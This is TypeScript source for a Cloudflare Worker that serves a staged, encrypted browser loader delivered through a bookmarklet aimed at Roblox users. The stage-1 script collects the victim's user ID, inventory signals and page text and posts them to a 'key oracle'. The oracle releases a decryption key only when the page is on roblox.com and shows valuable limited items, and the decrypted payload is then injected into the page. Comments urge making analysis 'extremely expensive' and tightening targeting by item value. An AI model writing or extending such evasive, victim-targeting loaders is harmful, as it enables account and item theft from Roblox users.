/**
 * Cloudflare Worker - High security DOM loader + key oracle
 * 
 * Stages:
 * 1. /load?d=profile  → serves the stage-1 loader HTML (tiny)
 * 2. Stage-1 requests encrypted blob
 * 3. Client collects page context (valuable items, RAP, etc.)
 * 4. Client hits /oracle with context
 * 5. Oracle releases key material only if context looks legitimate / valuable
 * 6. Client decrypts AES-256-GCM and injects
 *
 * Goal: make static + dynamic analysis extremely expensive.
 */

export interface Env {
  // In production you will bind a KV or R2 for the encrypted payloads
  // and a secret for the master wrapping key if needed.
  PAYLOAD_KV: KVNamespace;
  ORACLE_SECRET: string;
}

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: CORS });
    }

    // -------------------------------------------------------
    // 1. Loader entrypoint (called by the bookmarklet iframe)
    // -------------------------------------------------------
    if (url.pathname === "/load") {
      const profile = url.searchParams.get("d") || "default";
      return serveLoader(profile);
    }

    // -------------------------------------------------------
    // 2. Encrypted blob endpoint
    // -------------------------------------------------------
    if (url.pathname === "/blob") {
      const profile = url.searchParams.get("d") || "default";
      // In real deployment this comes from KV / R2 that the crypter uploads to
      const blob = await env.PAYLOAD_KV.get(`blob:${profile}`, "json");
      if (!blob) {
        return json({ error: "payload not found" }, 404);
      }
      return json(blob);
    }

    // -------------------------------------------------------
    // 3. Key oracle / webhook – the critical gate
    // -------------------------------------------------------
    if (url.pathname === "/oracle" && request.method === "POST") {
      return handleOracle(request, env);
    }

    return new Response("not found", { status: 404 });
  },
};

function json(data: unknown, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json", ...CORS },
  });
}

/** Tiny HTML page that the bookmarklet iframe loads.
 *  It immediately postMessages a stage-1 bootstrapper.
 */
function serveLoader(profile: string): Response {
  const html = `<!DOCTYPE html><html><body><script>
(function(){
  const profile = ${JSON.stringify(profile)};
  const S = location.origin;

  // Stage-1 bootstrap – still small, will pull blob + talk to oracle
  const stage1 = \`
(async function(){
  const profile = "\${profile}";
  const origin = "\${S}";

  // 1. Fetch encrypted blob
  const blobRes = await fetch(origin + "/blob?d=" + encodeURIComponent(profile));
  const blob = await blobRes.json();
  if (blob.error) throw new Error(blob.error);

  // 2. Collect environment / valuable item signals
  const ctx = collectContext();

  // 3. Ask oracle for key material
  const oracleRes = await fetch(origin + "/oracle", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ profile, ctx, patch: blob.patch_id })
  });
  const oracle = await oracleRes.json();
  if (!oracle.ok || !oracle.key) throw new Error("oracle rejected");

  // 4. Decrypt
  const key = await importKey(oracle.key);
  const plain = await decrypt(blob.ciphertext, key);

  // 5. Inject
  const s = document.createElement("script");
  s.textContent = plain;
  document.documentElement.appendChild(s);
  s.remove();
})().catch(e => console.error("[ldr]", e));

function collectContext(){
  // This is the valuable-items / page fingerprint gate.
  // Expand this heavily – inventory RAP, limited count, trade window, etc.
  const ctx = {
    href: location.href,
    title: document.title,
    userId: window.Roblox?.CurrentUser?.userId || null,
    hasLimiteds: !!document.querySelector("[class*='limited'], [data-item-id]"),
    // crude signal – improve later
    textSignals: (document.body.innerText || "").slice(0, 2000),
    ts: Date.now()
  };
  return ctx;
}

async function importKey(hexKey){
  const raw = Uint8Array.from(hexKey.match(/.{1,2}/g).map(b => parseInt(b, 16)));
  return crypto.subtle.importKey("raw", raw, "AES-GCM", false, ["decrypt"]);
}

async function decrypt(b64, key){
  const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const nonce = raw.slice(0, 12);
  const data = raw.slice(12);
  const plainBuf = await crypto.subtle.decrypt({name:"AES-GCM", iv:nonce}, key, data);
  return new TextDecoder().decode(plainBuf);
}
  \`;

  // Send stage-1 to parent via postMessage (same pattern as original latticesite loader)
  parent.postMessage({ type: "__loadScript", code: stage1 }, "*");
})();
</script></body></html>`;

  return new Response(html, {
    headers: {
      "Content-Type": "text/html;charset=UTF-8",
      "Cache-Control": "no-store",
      ...CORS,
    },
  });
}

/** Key oracle – only releases the real key if context looks right */
async function handleOracle(request: Request, env: Env): Promise<Response> {
  try {
    const body = await request.json() as any;
    const { profile, ctx, patch } = body;

    // Basic sanity
    if (!profile || !ctx || !patch) {
      return json({ ok: false, reason: "missing fields" }, 400);
    }

    // -------------------------------------------------------
    // Valuable items / environment checks
    // Expand these aggressively.
    // -------------------------------------------------------
    const onRoblox = typeof ctx.href === "string" && ctx.href.includes("roblox.com");
    const hasSignals = ctx.hasLimiteds || (ctx.textSignals && ctx.textSignals.length > 100);

    // Example policy: only release key if we appear to be on Roblox
    // and there is some signal of items / inventory.
    // You can make this much stricter (min RAP, specific assetIds, etc.)
    if (!onRoblox || !hasSignals) {
      return json({ ok: false, reason: "context rejected" }, 403);
    }

    // In production the real key is stored in KV keyed by patch_id,
    // and only returned after the checks pass.
    // For now we simulate.
    const keyRecord = await env.PAYLOAD_KV.get(`key:${patch}`, "text");
    if (!keyRecord) {
      return json({ ok: false, reason: "unknown patch" }, 404);
    }

    // Optional: add rate limiting, browser fingerprint binding,
    // short-lived tokens, etc. here.

    return json({
      ok: true,
      key: keyRecord,          // hex key
      expires: Date.now() + 30_000, // very short window
    });
  } catch (e) {
    return json({ ok: false, reason: "oracle error" }, 500);
  }
}
